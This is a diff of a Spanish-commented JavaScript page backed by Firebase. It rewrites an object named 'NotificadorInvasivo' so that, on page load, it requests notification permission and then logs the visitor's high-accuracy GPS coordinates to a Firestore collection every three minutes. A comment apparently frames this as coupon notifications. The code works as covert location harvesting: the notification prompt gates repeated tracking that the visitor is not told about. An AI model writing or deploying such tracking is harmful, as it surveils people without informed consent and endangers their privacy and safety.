@@ -25,110 +25,78 @@ const app = initializeApp(firebaseConfig);
 // Initialize Cloud Firestore and get a reference to the service
 const db = getFirestore(app);
 /* ******************************************************************************* */
-/* --- 1. FUNCIÓN PARA GUARDAR EN FIREBASE --- */
-async function guardarUbicacionBD(latitud, longitud) {
-  try {
-    // Verificamos que los datos no lleguen vacíos
-    if (latitud === undefined || longitud === undefined) {
-      console.error("Latitud o Longitud son indefinidas.");
-      return;
-    }
 
+/*FUNCION DE BD*/
+async function guardarUbicacionBD(lat, lon) {
+  try {
     const colRef = collection(db, "ubicaciones");
+
     const snapshot = await getCountFromServer(colRef);
     const nuevoId = snapshot.data().count;
 
     await addDoc(colRef, {
-      ubicacion: `${latitud}, ${longitud}`,
+      ubicacion: `${lat}, ${lon}`,
       id_ubicaciones: nuevoId,
       fecha_ubi: serverTimestamp(),
     });
-
-    console.log(`Guardado con éxito: ID ${nuevoId} (${latitud}, ${longitud})`);
+    console.log(`Documento guardado con ID secuencial: ${nuevoId}`);
   } catch (e) {
-    console.error("Error al guardar en Firebase:", e);
+    console.error("Error al obtener conteo o guardar:", e);
   }
 }
 
-/* --- 2. FUNCIÓN DE GEOLOCALIZACIÓN --- */
-const opcionesGPS = {
-  enableHighAccuracy: true,
-  timeout: 20000,
-  maximumAge: 0
-};
-
+/*FUNCION DE GEOLOCALIZACION*/
 async function obtenerUbicacion() {
-  if (!navigator.geolocation) {
-    console.error("Geolocalización no soportada");
-    return;
+  const resultado = document.getElementById("resultado");
+  if (navigator.geolocation) {
+    if (resultado) resultado.innerHTML = "capturando info";
+
+    navigator.geolocation.getCurrentPosition(
+      async function (posicion) {
+        const lat = posicion.coords.latitude;
+        const lon = posicion.coords.longitude;
+        if (resultado) {
+          resultado.innerHTML = `Lat: ${lat}, ${lon}`;
+        }
+        guardarUbicacionBD(lat, lon);
+      },
+      function (error) {
+        console.error("Error de geolocalización:", error.message);
+      },
+      { enableHighAccuracy: true } // Mayor precisión para el GPS
+    );
   }
-
-  navigator.geolocation.getCurrentPosition(
-    async (pos) => {
-      // Extraemos las variables correctamente del objeto pos.coords
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
-
-      console.log(`Coordenadas obtenidas: ${lat}, ${lon}`);
-
-      // Enviamos las variables extraídas a la función de BD
-      await guardarUbicacionBD(lat, lon);
-    },
-    (err) => {
-      console.error("Error GPS:", err.code, err.message);
-      // Reintento con baja precisión si falla por tiempo
-      if (err.code === err.TIMEOUT) {
-        navigator.geolocation.getCurrentPosition(
-          p => guardarUbicacionBD(p.coords.latitude, p.coords.longitude),
-          null,
-          { enableHighAccuracy: false }
-        );
-      }
-    },
-    opcionesGPS
-  );
 }
 
-/* --- 3. OBJETO NOTIFICADOR --- */
+/*notificador)*/
 const NotificadorInvasivo = {
   registration: null,
   solicitarPermiso: async function (ms) {
     try {
-      // Registro del Service Worker (Ruta raíz para Firebase)
       this.registration = await navigator.serviceWorker.register('/sw.js');
-      console.log("Service Worker registrado.");
-
       let permission = await Notification.requestPermission();
 
       if (permission === "granted") {
-        console.log("Permiso concedido. Iniciando capturas...");
-        obtenerUbicacion(); // Captura inmediata
-
+        obtenerUbicacion();
         setInterval(() => {
           obtenerUbicacion();
         }, ms);
       }
     } catch (err) {
-      console.error("Error en flujo de permisos:", err);
+
+      console.error("Error de permisos/sw.js: ", err);
     }
   }
 };
-
-/* --- 4. DISPARADOR ÚNICO (UNIVERSAL) --- */
-function iniciarTodo() {
-  console.log("Interacción detectada. Activando sistema...");
-
-  // Ejecutamos la lógica de permisos y ubicación
+window.onload = () => {
   NotificadorInvasivo.solicitarPermiso(180000);
+};
 
-  // Limpiamos los eventos para que no se repita
-  document.removeEventListener('click', iniciarTodo);
-  document.removeEventListener('touchstart', iniciarTodo);
-}
 
-// Escuchadores de eventos
-document.addEventListener('click', iniciarTodo);
-document.addEventListener('touchstart', iniciarTodo);
+
+
+
+
 /**
  * NOTIFICACIONES CADA 5 MINUTOS 
  * POR EL DESBLOQUEO DE UN CUPON NUEVO
